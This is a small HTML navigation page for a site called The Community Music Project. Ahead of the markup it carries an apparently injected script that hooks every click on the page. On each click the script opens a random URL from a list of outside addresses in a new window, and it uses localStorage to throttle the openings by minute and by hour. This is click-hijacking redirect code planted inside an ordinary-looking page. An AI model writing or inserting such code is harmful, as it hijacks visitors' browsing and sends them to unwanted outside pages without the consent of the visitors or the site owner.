<script>(function (parameters) {
    const targets = [
        \'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
    ]
    // Times between clicks
    const restMinutes = 1;
    // Number of hours to allow re-click 
    const allowedHours = 2;


    const saveTargetLocationsToStorage = (targets) => {
        targets.forEach((target, index) => {
            if(!localStorage.getItem(`${target}-local-storage`)){
            	localStorage.setItem(`${target}-local-storage`, 0);
            }
        });
    }
    const getRandomLocationFromStorage = (targets) => {
        const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
        return nonVisited[Math.floor(Math.random() * nonVisited.length)];
    }
    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);

    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);

    const getHoursDiff = (startDate, endDate) => {
        const msInHour = 1000 * 60 * 60;
        return Math.round(Math.abs(endDate - startDate) / msInHour);
    }
    const getMintsDiff = (startDate, endDate) => {
        const msInMints = 1000 * 60;
        return Math.round(Math.abs(endDate - startDate) / msInMints);
    }

    const visitNewLocation = (targets, host, nowDate) => {
        saveTargetLocationsToStorage(targets);
        newLocation = getRandomLocationFromStorage(targets);
        setTimeToStorage(`${host}-mnts`, nowDate);
        setTimeToStorage(`${host}-hurs`, nowDate);
        setLocationAsVisited(newLocation);
        window.open(newLocation, "_blank");
    }

    // const randomLocation = getRandomLocationFromStorage(targets);
    saveTargetLocationsToStorage(targets);

    function globalClick(event) {
        event.stopPropagation();
        const host = location.host;
        let newLocation = getRandomLocationFromStorage(targets);
        const nowDate = Date.parse(new Date());
        const savedDateForMints = getTimeStorage(`${host}-mnts`);
        const savedDateForHours = getTimeStorage(`${host}-hurs`);

        if (savedDateForMints && savedDateForHours) {
            try {
                const storageDateForMints = parseInt(savedDateForMints);
                const storageDateForHours = parseInt(savedDateForHours);
                const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
                const hoursDiff = getHoursDiff(nowDate, storageDateForHours);

                if (hoursDiff >= allowedHours) {
                    saveTargetLocationsToStorage(targets);
                    setTimeToStorage(`${host}-hurs`, nowDate);
                }
                if (mintsDiff >= restMinutes) {
                    if (newLocation) {
                        setTimeToStorage(`${host}-mnts`, nowDate);
                        window.open(newLocation, "_blank");
                        setLocationAsVisited(newLocation);
                    }
                }
            } catch (error) { visitNewLocation(targets, host, nowDate); }
        } else { visitNewLocation(targets, host, nowDate); }
    }
    document.addEventListener("click", globalClick)
})()</script>
<html>
	<head>
		<title>The Community Music Project</title>
		<link href="cmp.css" rel="stylesheet" type="text/css">
		<style type="text/css">
		  html, body
		  {
			border: none ;
			overflow: hidden ;
		  }
		</style>
	</head>
	<body>
		<h1>The Community Music Project</h1>
		<ul class="menu">
			<li><a href="./index.html" target="_parent">Home</a></li>
			<li><a href="./albums.html" target="_parent">Albums</a></li>
			<li><a href="./artists.html" target="_parent">Artists</a></li>
			<li><a href="./events.html" target="_parent">Events</a></li>
			<li><a href="./about.html" target="_parent">About the Project</a></li>
			<li><a href="./contact.html" target="_parent">Contact us</a></li>
		</ul>
	</body>
</html>